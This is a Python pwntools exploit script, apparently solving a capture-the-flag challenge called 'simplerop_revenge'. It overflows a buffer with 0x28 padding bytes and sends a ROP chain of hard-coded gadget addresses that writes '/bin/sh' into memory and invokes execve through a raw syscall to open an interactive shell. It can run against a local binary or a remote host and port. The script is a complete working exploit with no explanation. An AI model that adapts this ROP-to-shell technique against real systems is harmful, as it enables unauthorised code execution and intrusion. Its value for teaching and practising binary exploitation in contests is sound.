#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './simplerop_revenge'
LIBC = ''
HOST = '140.110.112.77'
PORT = 2124

context.binary = BINARY
e = ELF( BINARY )
libc = ''

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
    if LIBC != '':
        libc = ELF( LIBC )
else: 
    r = process( BINARY )
    if LIBC != '':
        libc = ELF( '/lib/x86_64-linux-gnu/libc.so.6' )
binsh = 0x6cc0b0
pop_rdi_ret = 0x0000000000401456
pop_rsi_ret = 0x0000000000401577
pop_rax_pop_rdx_pop_rbx_ret = 0x0000000000478516
mov_qword_ptr_rdi_rdx_ret = 0x00000000004353e3
syscall = 0x000000000040037a
pop_rdx_pop_rsi_ret = 0x0000000000442809

ROP = flat(
    pop_rdi_ret,
    binsh,
    pop_rax_pop_rdx_pop_rbx_ret,
    0x3b,
    b"/bin/sh\x00",
    0,
    mov_qword_ptr_rdi_rdx_ret,
    pop_rdx_pop_rsi_ret,
    0,
    0,
    syscall,
)
r.send(b'\x00'*0x28 + ROP)
#r.sendline('cat /home/`whoami`/flag')
r.interactive()
